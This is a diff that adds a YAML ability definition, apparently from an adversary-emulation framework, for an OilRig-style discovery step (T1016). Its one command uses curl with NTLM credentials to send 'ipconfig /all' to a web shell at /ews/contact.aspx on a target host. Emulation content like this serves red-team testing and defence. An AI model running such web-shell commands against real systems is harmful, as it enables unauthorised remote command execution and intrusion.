@@ -1,0 +1,32 @@
+ability_id: 48927544-5a18-11ed-9b6a-0242ac120002
+access: {}
+additional_info: {}
+buckets:
+- discovery
+delete_payload: true
+description: Attacker machine views network configuration information for gosta on
+  10.1.0.6
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST --data "pro=cmd.exe" --data "cmd=ipconfig /all" https://#{second.target.ip}/ews/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig Network Interface Configuration (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: discovery
+technique_id: T1016
+technique_name: System Network Configuration Discovery
